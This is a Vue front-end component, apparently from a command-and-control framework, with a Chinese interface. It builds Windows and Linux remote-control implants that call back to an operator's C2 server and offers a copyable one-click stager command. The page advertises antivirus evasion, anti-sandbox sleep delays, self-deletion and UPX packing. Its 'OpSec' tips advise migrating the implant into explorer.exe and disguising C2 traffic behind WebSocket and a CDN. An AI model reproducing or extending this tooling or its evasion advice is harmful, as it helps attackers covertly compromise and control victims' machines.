<template>
  <div class="payload-page-container">
    <el-row :gutter="24">
      <el-col :span="16">
        <!-- Main Generation Panel -->
        <div class="main-panel glass-panel mb-24">
          <div class="panel-header">
            <div class="header-info">
              <h2 class="panel-title">资产同步 <span class="purple-text">受控端生成</span></h2>
              <p class="panel-sub">分发多平台受控端载荷</p>
            </div>
            <el-tag type="info" class="premium-tag" effect="plain" round>CORE V3 STABLE</el-tag>
          </div>

          <el-form :model="form" label-position="top" class="premium-form">
            <!-- Platform Selection -->
            <div class="form-section">
              <label class="section-label">1. 目标平台指令架构</label>
              <div class="platform-grid">
                <div class="platform-group" :class="{ active: form.combinedType.startsWith('win') }">
                  <div class="os-brand"><el-icon><Platform /></el-icon> Windows</div>
                  <el-radio-group v-model="form.combinedType" size="small">
                    <el-radio-button label="windows_amd64">X64 (标准)</el-radio-button>
                    <el-radio-button label="windows_i386">X86 (旧版)</el-radio-button>
                  </el-radio-group>
                </div>
                <div class="platform-group" :class="{ active: form.combinedType.startsWith('lin') }">
                  <div class="os-brand"><el-icon><ChromeFilled /></el-icon> Linux</div>
                  <el-radio-group v-model="form.combinedType" size="small">
                    <el-radio-button label="linux_amd64">AMD64</el-radio-button>
                    <el-radio-button label="linux_arm64">ARM64 / M1</el-radio-button>
                  </el-radio-group>
                </div>
              </div>
            </div>

            <el-row :gutter="20">
              <el-col :span="12">
                <el-form-item label="2. 回连监听链路" required>
                  <el-select 
                    v-model="form.listenerId" 
                    placeholder="选择活跃的通讯链路" 
                    class="premium-select"
                    @change="onListenerChange"
                  >
                    <el-option 
                      v-for="l in activeListeners" 
                      :key="l.id" 
                      :label="`${l.protocol} | Port: ${l.port}`" 
                      :value="l.id" 
                    />
                  </el-select>
                </el-form-item>
              </el-col>
              <el-col :span="12">
                <el-form-item label="3. 回连路由地址" v-if="selectedListener?.protocol !== '正向TCP'">
                  <el-input v-model="form.lhost" placeholder="C2 服务器公网 IP 或域名" prefix-icon="MapLocation" />
                </el-form-item>
              </el-col>
            </el-row>

            <!-- Configuration Options -->
            <div class="config-tabs-box glass-panel mt-10">
              <div class="config-header">
                 <div class="tab-btn" :class="{ active: form.mode === 'build' }" @click="form.mode = 'build'">源码级静态编译</div>
                 <div class="tab-btn" :class="{ active: form.mode === 'patch' }" @click="form.mode = 'patch'">二进制补丁分发</div>
              </div>
              <div class="config-body">
                 <div class="mode-info" v-if="form.mode === 'build'">
                    <el-icon><Cpu /></el-icon>
                    <span>调用远程 Rust 编译器。全静态链接，去除符号，免杀性极高（约 40s）。</span>
                 </div>
                 <div class="mode-info" v-else>
                    <el-icon><Flashlight /></el-icon>
                    <span>基于预编译模板。仅需毫秒级即可生成，适用于快速大规模投递。</span>
                 </div>

                 <el-divider class="mini-divider" />

                 <el-row :gutter="24">
                   <el-col :span="8">
                     <div class="toggle-item">
                        <span class="label">自研休眠抗沙箱</span>
                        <el-input-number v-model="form.sleepTime" :min="0" size="small" controls-position="right" />
                     </div>
                   </el-col>
                   <el-col :span="8">
                     <div class="toggle-item">
                        <span class="label">运行后文件自毁</span>
                        <el-switch v-model="form.autoDestruct" active-color="#7c3aed" />
                     </div>
                   </el-col>
                   <el-col :span="8">
                     <div class="toggle-item">
                        <span class="label">UPX 壳极限压缩</span>
                        <el-switch v-model="form.useUPX" active-color="#7c3aed" />
                     </div>
                   </el-col>
                 </el-row>
              </div>
            </div>

            <!-- Generate Action -->
            <div class="generate-footer mt-24">
               <div class="target-chip">
                  <span class="chip-label">生成目标:</span>
                  <span class="chip-value">{{ previewUrl }}</span>
               </div>
               <el-button 
                 type="primary" 
                 class="huge-generate-btn" 
                 :loading="loading" 
                 @click="doGenerate"
               >
                 <el-icon v-if="!loading"><Download /></el-icon>
                 编译并同步受控端
               </el-button>
            </div>
          </el-form>
        </div>
      </el-col>

      <el-col :span="8">
        <!-- Quick Stager Column -->
        <div class="stager-panel glass-panel mb-24">
          <div class="panel-header mini">
            <h3 class="panel-title small">一键注入指令</h3>
          </div>
          <div class="stager-content" v-loading="stagerLoading">
            <div class="terminal-mini" v-if="stagerCommand">
               <div class="term-dots"><span></span><span></span><span></span></div>
               <pre><code>{{ stagerCommand }}</code></pre>
               <el-button link class="copy-mini-btn" @click="copyStagerCommand">
                 <el-icon><CopyDocument /></el-icon> 复制指令
               </el-button>
            </div>
            <div class="stager-empty" v-else>
               请在左侧选择平台与链路以生成快速上线脚本
            </div>
          </div>
        </div>

        <!-- OpSec Tips -->
        <div class="tips-panel glass-panel">
          <div class="panel-header mini">
            <h3 class="panel-title small">OpSec 战术建议</h3>
          </div>
          <div class="tips-list">
             <div class="tip-item">
                <div class="tip-icon purple"><el-icon><Lock /></el-icon></div>
                <div class="tip-text">上线后请优先执行 <b>migrate</b> 迁移受控端至系统核心进程（如 explorer.exe），此举可大幅提高生存率。</div>
             </div>
             <div class="tip-item">
                <div class="tip-icon green"><el-icon><Connection /></el-icon></div>
                <div class="tip-text">建议使用 <b>WebSocket</b> 协议配合 CDN 伪装，流量特征更接近正常办公请求。</div>
             </div>
             <div class="tip-item">
                <div class="tip-icon blue"><el-icon><Share /></el-icon></div>
                <div class="tip-text">休眠抗沙箱建议设置在 <b>10-30s</b>，足以绕过大多数自动化模拟分析器。</div>
             </div>
          </div>
        </div>
      </el-col>
    </el-row>

    <!-- Build Terminal Dialog -->
    <el-dialog 
      v-model="showTerminal"
      width="920px"
      class="terminal-dialog-v2"
      :show-close="false"
      destroy-on-close
      @opened="onTerminalOpened"
      @closed="onTerminalClosed"
    >
      <template #header>
        <div class="term-dialog-header">
           <div class="header-main">
              <el-icon class="spin"><Cpu /></el-icon>
              <span>正在构建独立受控端 ... ({{ currentTaskId.slice(0,8) }})</span>
           </div>
           <div class="header-actions">
              <el-button link class="minimize-btn" @click="isMinimized = true"><el-icon><Minus /></el-icon></el-button>
              <el-button link class="close-btn" @click="showTerminal = false"><el-icon><Close /></el-icon></el-button>
           </div>
        </div>
      </template>
      <div class="terminal-body-v3">
         <!-- Dashboard Header (IDE style) -->
         <div class="build-stats-bar">
            <div class="stat-item">
               <div class="stat-icon"><el-icon><Cpu /></el-icon></div>
               <div class="stat-info">
                  <div class="stat-label">管道状态</div>
                  <div class="stat-value" style="color: #10b981;">{{ buildStatusText }}</div>
               </div>
            </div>
            <div class="stat-item">
               <div class="stat-icon"><el-icon><Refresh /></el-icon></div>
               <div class="stat-info">
                  <div class="stat-label">已耗时长</div>
                  <div class="stat-value" style="font-family: 'JetBrains Mono'; color: #f8fafc;">{{ elapsedTime }}s</div>
               </div>
            </div>
            <div class="stat-item">
               <div class="stat-icon"><el-icon><Monitor /></el-icon></div>
               <div class="stat-info">
                  <div class="stat-label">目标架构</div>
                  <div class="stat-value" style="color: #38bdf8; font-family: 'JetBrains Mono'; font-size: 11px;">{{ form.combinedType }}</div>
               </div>
            </div>
         </div>

         <!-- Visual Pipeline Steps -->
         <div class="build-pipeline">
            <div class="pipe-step" :class="{ active: buildStage >= 1, done: buildStage > 1 }"><span>1</span> 预检环境</div>
            <div class="pipe-line" :class="{ done: buildStage > 1 }"></div>
            <div class="pipe-step" :class="{ active: buildStage >= 2, done: buildStage > 2 }"><span>2</span> 源码静态编译</div>
            <div class="pipe-line" :class="{ done: buildStage > 2 }"></div>
            <div class="pipe-step" :class="{ active: buildStage >= 3, done: buildStage > 3 }"><span>3</span> 安全壳压缩</div>
         </div>

         <div class="term-toolbar-v3">
            <div class="toolbar-left">
               <span class="status-badge-v3">实时控制台输出 (Stdout)</span>
            </div>
            <div class="toolbar-right">
               <el-button link class="tool-btn" @click="exportLogs">导出日志</el-button>
               <el-button link class="tool-btn" @click="clearTerminal">清屏</el-button>
            </div>
         </div>
         <div class="terminal-mount-box">
            <div ref="terminalContainer" class="xterm-mount"></div>
         </div>
      </div>
    </el-dialog>

    <!-- Floating Bubble -->
    <transition name="pop">
      <div v-if="isMinimized && showTerminal" class="build-bubble-v2" @click="isMinimized = false">
        <el-icon class="pulse"><Cpu /></el-icon>
        <div class="bubble-info">
          <div class="bubble-title">正在构建...</div>
          <div class="bubble-id">任务 ID: {{ currentTaskId.slice(0,8) }}</div>
        </div>
      </div>
    </transition>
  </div>
</template>

<script setup>
import { ref, computed, onMounted, onUnmounted, watch } from 'vue'
import { 
  Plus, Monitor, Connection, Share, Lightning, Download, Refresh,
  CopyDocument, MapLocation, Cpu, Lock, Setting, Minus, Close, 
  Platform, ChromeFilled
} from '@element-plus/icons-vue'
import { ElMessage } from 'element-plus'
import { getListeners, generateClient, request } from '@/api'
import { Terminal as XTerm } from 'xterm'
import { FitAddon } from 'xterm-addon-fit'
import 'xterm/css/xterm.css'

const loading = ref(false)
const activeListeners = ref([])
const showTerminal = ref(false)
const isMinimized = ref(false)
const currentTaskId = ref('')
const logBuffer = ref([])
let xterm = null
let fitAddon = null
let ws = null
const terminalContainer = ref(null)

const form = ref({
  combinedType: 'windows_amd64',
  listenerId: '',
  lhost: window.location.hostname || '127.0.0.1',
  mode: 'build',
  autoDestruct: false,
  sleepTime: 0,
  aesKey: '',
  useUPX: false,
  encryption_salt: '',
  obfuscation_mode: 'none'
})

const stagerLoading = ref(false)
const stagerCommand = ref('')

watch([() => form.value.combinedType, () => form.value.listenerId], () => fetchStagerCommand())

watch(isMinimized, (val) => {
  if (val) {
    document.body.classList.add('dialog-backdrop-hidden')
  } else {
    document.body.classList.remove('dialog-backdrop-hidden')
  }
})

onMounted(async () => {
    try {
      const res = await getListeners()
      activeListeners.value = res.data.filter(l => l.status === 'Running')
      if (activeListeners.value.length > 0) {
        form.value.listenerId = activeListeners.value[0].id
        onListenerChange(form.value.listenerId)
      }
    } catch (e) { ElMessage.error('无法加载链路数据') }
})

onUnmounted(() => {
    if (ws) ws.close()
    if (xterm) xterm.dispose()
})

const selectedListener = computed(() => activeListeners.value.find(l => l.id === form.value.listenerId))

const previewUrl = computed(() => {
  if (!selectedListener.value) return '---'
  const proto = selectedListener.value.protocol.toLowerCase()
  if (proto === 'websocket') return `ws://${form.value.lhost}:${selectedListener.value.port}/ws`
  if (proto === '正向tcp') return `LOCAL_BIND : ${selectedListener.value.port}`
  if (proto === 'dns') return `NS: ${selectedListener.value.ns_domain}`
  return `${selectedListener.value.protocol}://${form.value.lhost}:${selectedListener.value.port}`
})

const onListenerChange = (id) => {
  const l = activeListeners.value.find(item => item.id === id)
  if (l) {
    form.value.aesKey = l.encrypt_key || ''
    form.value.encryption_salt = l.encryption_salt || ''
    form.value.obfuscation_mode = l.obfuscate_mode || 'none'
  }
}

const doGenerate = async () => {
  if (!form.value.listenerId) return ElMessage.warning('请选择通信链路')
  loading.value = true
  try {
    const payload = {
      os: form.value.combinedType.split('_')[0],
      arch: form.value.combinedType,
      listener_id: form.value.listenerId,
      host: form.value.lhost,
      method: form.value.mode,
      auto_destruct: form.value.autoDestruct,
      sleep_time: form.value.sleepTime,
      aes_key: form.value.aesKey,
      use_upx: form.value.useUPX,
      encryption_salt: form.value.encryption_salt,
      obfuscation_mode: form.value.obfuscation_mode
    }
    const response = await generateClient(payload)
    const blobData = response.data
    if (blobData.type === 'application/json' || blobData.size < 2048) {
        const text = await blobData.text()
        const json = JSON.parse(text)
        if (json.task_id) {
            currentTaskId.value = json.task_id
            showTerminal.value = true
            return
        }
    }
    handleDirectDownload(blobData)
  } catch (e) { ElMessage.error('构造异常') }
  finally { loading.value = false }
}

const handleDirectDownload = (blob) => {
    const os = form.value.combinedType.split('_')[0]
    const ext = os === 'windows' ? '.exe' : ''
    const url = window.URL.createObjectURL(new Blob([blob]))
    const a = document.createElement('a')
    a.href = url
    a.download = `agent_${form.value.combinedType}${ext}`
    a.click()
}

const fetchStagerCommand = async () => {
    if (!form.value.listenerId) return
    stagerLoading.value = true
    try {
        const os = form.value.combinedType.split('_')[0]
        const res = await request.get('/api/stager', {
            params: { listener_id: form.value.listenerId, os, host: form.value.lhost }
        })
        stagerCommand.value = res.data.command
    } catch (e) { stagerCommand.value = '' }
    finally { stagerLoading.value = false }
}

const copyStagerCommand = () => {
    navigator.clipboard.writeText(stagerCommand.value)
    ElMessage.success('已复制到剪贴板')
}

// Terminal Logic
const buildStatusText = ref('准备就绪')
const buildStage = ref(1)
const elapsedTime = ref(0)
let buildTimer = null

const onTerminalOpened = () => {
    elapsedTime.value = 0; buildStage.value = 1; buildStatusText.value = '预检后端环境...'
    clearInterval(buildTimer); buildTimer = setInterval(() => { elapsedTime.value++ }, 1000)

    xterm = new XTerm({ theme: { background: '#ffffff', foreground: '#1e1b4b', cursor: '#7c3aed' }, fontSize: 13, fontFamily: 'JetBrains Mono', convertEol: true })
    fitAddon = new FitAddon(); xterm.loadAddon(fitAddon); xterm.open(terminalContainer.value); fitAddon.fit()

    let baseWs = (import.meta.env.VITE_API_BASE_URL || "").replace('http', 'ws') || `${window.location.protocol === 'https:' ? 'wss:' : 'ws:'}//${window.location.host}`
    const token = localStorage.getItem('cupcake_token')
    ws = new WebSocket(`${baseWs}/api/build/logs/${currentTaskId.value}?token=${token}`)
    ws.onmessage = (e) => {
        const p = JSON.parse(e.data)
        if (p.type === 'log') { 
            xterm.writeln(p.content); logBuffer.value.push(p.content.replace(/\u001b\[\d+m/g, '')) 
            const text = p.content.toLowerCase()
            if (text.includes("cargo") || text.includes("compiling")) { buildStage.value = 2; buildStatusText.value = '正在静态编译核心...' }
            else if (text.includes("upx")) { buildStage.value = 3; buildStatusText.value = '壳层压缩中...' }
        }
        else if (p.type === 'success') { 
            xterm.writeln(`\x1b[32m[OK] DONE: ${p.content}\x1b[0m`); downloadArtifact(p.content)
            buildStatusText.value = '构建成功'; buildStage.value = 4; clearInterval(buildTimer)
        }
        else if (p.type === 'error') { xterm.writeln(`\x1b[31m[FAIL] ${p.content}\x1b[0m`); buildStatusText.value = '构建失败'; clearInterval(buildTimer) }
    }
}
const onTerminalClosed = () => { if (ws) ws.close(); if (xterm) xterm.dispose(); isMinimized.value = false; clearInterval(buildTimer); }
const clearTerminal = () => { xterm?.clear(); logBuffer.value = []; }
const exportLogs = () => {
    const b = new Blob([logBuffer.value.join('\n')], { type: 'text/plain' })
    const a = document.createElement('a')
    a.href = URL.createObjectURL(b); a.download = `log_${currentTaskId.value.slice(0,8)}.txt`; a.click()
}
const downloadArtifact = async (u) => {
    const res = await request.get(u, { responseType: 'blob' })
    const a = document.createElement('a')
    a.href = URL.createObjectURL(res.data); a.download = u.split('/').pop(); a.click()
}
</script>

<style scoped>
.payload-page-container { padding: 0; animation: fadeIn 0.6s ease-out; }
@keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }

.mb-24 { margin-bottom: 24px; }
.mt-10 { margin-top: 10px; }
.mt-24 { margin-top: 24px; }

/* Panes */
.glass-panel {
  background: rgba(255, 255, 255, 0.75);
  backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
  border: 1px solid rgba(124, 58, 237, 0.08); border-radius: 24px;
  box-shadow: 0 10px 30px rgba(124, 58, 237, 0.05);
  padding: 24px;
}

.panel-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
.panel-title { font-size: 24px; font-weight: 900; color: #1e1b4b; margin: 0; }
.purple-text { color: #7c3aed; }
.panel-sub { font-size: 13px; color: #94a3b8; font-weight: 600; margin-top: 4px; }

/* Platform Grid */
.platform-grid { display: flex; gap: 20px; }
.platform-group { flex: 1; background: #f8fafc; border-radius: 16px; padding: 16px; transition: all 0.3s; border: 1px solid transparent; }
.platform-group.active { background: rgba(124, 58, 237, 0.04); border-color: rgba(124, 58, 237, 0.1); }
.os-brand { display: flex; align-items: center; gap: 8px; font-weight: 800; font-size: 14px; color: #475569; margin-bottom: 12px; }
:deep(.el-radio-button__inner) { border-radius: 8px !important; margin-right: 8px; font-weight: 700; border: 1px solid #e2e8f0 !important; }

/* Config Box */
.config-tabs-box { padding: 0; overflow: hidden; }
.config-header { display: flex; background: #f8fafc; border-bottom: 1px solid rgba(124, 58, 237, 0.05); }
.tab-btn { flex: 1; text-align: center; padding: 12px; font-size: 13px; font-weight: 800; color: #94a3b8; cursor: pointer; transition: all 0.2s; }
.tab-btn.active { color: #7c3aed; background: white; }

.config-body { padding: 20px; }
.mode-info { display: flex; align-items: center; gap: 10px; color: #64748b; font-size: 12px; font-weight: 600; margin-bottom: 20px; }
.mini-divider { margin: 15px 0; border-color: rgba(124, 58, 237, 0.05); }

.toggle-item { display: flex; align-items: center; justify-content: space-between; }
.toggle-item .label { font-size: 13px; font-weight: 800; color: #1e1b4b; }

/* Footer */
.generate-footer { display: flex; justify-content: space-between; align-items: center; }
.target-chip { display: flex; gap: 8px; font-family: 'JetBrains Mono'; font-size: 12px; }
.chip-label { color: #94a3b8; font-weight: 700; }
.huge-generate-btn { padding: 0 40px; height: 50px; font-size: 15px; font-weight: 900; background: #7c3aed !important; border: none !important; border-radius: 16px; box-shadow: 0 10px 25px rgba(124, 58, 237, 0.3); }

/* Stager Column */
.panel-title.small { font-size: 15px; font-weight: 800; color: #1e1b4b; }
.stager-content { min-height: 120px; display: flex; align-items: center; justify-content: center; }
.terminal-mini { background: #0f172a; width: 100%; border-radius: 12px; padding: 16px; position: relative; }
.term-dots { display: flex; gap: 5px; margin-bottom: 10px; }
.term-dots span { width: 6px; height: 6px; border-radius: 50%; background: #334155; }
.terminal-mini pre { margin: 0; white-space: pre-wrap; word-break: break-all; }
.terminal-mini code { font-family: 'JetBrains Mono'; font-size: 11px; color: #38bdf8; line-height: 1.6; }
.copy-mini-btn { position: absolute; top: 10px; right: 10px; color: #94a3b8; font-size: 12px; font-weight: 800; }
.stager-empty { font-size: 12px; color: #cbd5e1; font-weight: 600; text-align: center; }

/* Tips */
.tips-list { display: flex; flex-direction: column; gap: 20px; }
.tip-item { display: flex; gap: 12px; }
.tip-icon { width: 34px; height: 34px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 16px; flex-shrink: 0; }
.tip-icon.purple { background: rgba(124, 58, 237, 0.1); color: #7c3aed; }
.tip-icon.green { background: rgba(16, 185, 129, 0.1); color: #10b981; }
.tip-icon.blue { background: rgba(14, 165, 233, 0.1); color: #0ea5e9; }
.tip-text { font-size: 12px; line-height: 1.6; color: #475569; font-weight: 500; }

/* global rule to hide dialog overlay when minimized to preserve background ws */
:global(body.dialog-backdrop-hidden .el-overlay) {
  display: none !important;
}

/* Terminal Dialog */
:deep(.terminal-dialog-v2 .el-dialog) { background: #ffffff !important; border-radius: 24px !important; overflow: hidden; box-shadow: 0 20px 50px rgba(124, 58, 237, 0.12) !important; }
.term-dialog-header { display: flex; justify-content: space-between; align-items: center; padding: 16px 24px; background: #ffffff; color: #1e1b4b; border-bottom: 1px solid rgba(124, 58, 237, 0.05); }
.header-main { display: flex; align-items: center; gap: 12px; font-weight: 800; font-size: 14px; color: #1e1b4b; }
.spin { animation: spin 2s linear infinite; color: #7c3aed; }
@keyframes spin { from { rotate: 0deg; } to { rotate: 360deg; } }
.terminal-body-v3 { padding: 0; background: #ffffff; }
.term-toolbar-v3 { display: flex; justify-content: space-between; padding: 8px 24px; background: #f8fafc; border-top: 1px solid rgba(124, 58, 237, 0.05); border-bottom: 1px solid rgba(124, 58, 237, 0.05); }
.status-badge-v3 { font-size: 10px; font-weight: 900; color: #10b981; }
.terminal-mount-box { height: 430px; padding: 12px; background: #ffffff; }
.close-btn, .minimize-btn { color: #64748b !important; }

/* Build Stats Bar */
.build-stats-bar {
  display: flex; gap: 16px; padding: 16px 24px;
  background: #ffffff; border-bottom: 1px solid rgba(124, 58, 237, 0.05);
}
.stat-item {
  flex: 1; display: flex; align-items: center; gap: 12px;
  background: #f8fafc; padding: 12px 16px; border-radius: 12px;
}
.stat-icon {
  width: 36px; height: 36px; border-radius: 8px;
  background: rgba(124, 58, 237, 0.1); color: #7c3aed;
  display: flex; align-items: center; justify-content: center; font-size: 18px;
}
.stat-info { display: flex; flex-direction: column; }
.stat-label { font-size: 10px; font-weight: 800; color: #94a3b8; text-transform: uppercase; }
.stat-value { font-size: 13px; font-weight: 800; margin-top: 2px; }

/* Visual Pipeline Steps */
.build-pipeline {
  display: flex; align-items: center; padding: 16px 32px;
  background: #ffffff; border-bottom: 1px solid rgba(124, 58, 237, 0.05);
}
.pipe-step {
  display: flex; align-items: center; gap: 8px;
  font-size: 12px; font-weight: 800; color: #94a3b8;
  transition: all 0.3s;
}
.pipe-step span {
  width: 20px; height: 20px; border-radius: 50%;
  background: #f1f5f9; color: #64748b;
  display: flex; align-items: center; justify-content: center;
  font-size: 11px; font-weight: 800; transition: all 0.3s;
}
.pipe-line {
  flex: 1; height: 2px; background: #e2e8f0; margin: 0 12px;
  transition: all 0.3s;
}
.pipe-step.active { color: #7c3aed; }
.pipe-step.active span { background: rgba(124, 58, 237, 0.1); color: #7c3aed; box-shadow: 0 0 10px rgba(124, 58, 237, 0.2); }
.pipe-step.done { color: #10b981; }
.pipe-step.done span { background: rgba(16, 185, 129, 0.1); color: #10b981; }
.pipe-line.done { background: #10b981; }

/* Bubble */
.build-bubble-v2 { position: fixed; bottom: 32px; right: 32px; background: #7c3aed; padding: 12px 24px; border-radius: 20px; color: white; display: flex; align-items: center; gap: 12px; cursor: pointer; box-shadow: 0 10px 30px rgba(124, 58, 237, 0.4); z-index: 2000; animation: scaleIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
.bubble-info { display: flex; flex-direction: column; }
.bubble-title { font-size: 12px; font-weight: 900; }
.bubble-id { font-size: 10px; opacity: 0.8; font-family: 'JetBrains Mono'; }
.pulse { font-size: 20px; animation: pulse 2s infinite; }
@keyframes pulse { 0% { scale: 1; } 50% { scale: 1.2; } 100% { scale: 1; } }
</style>
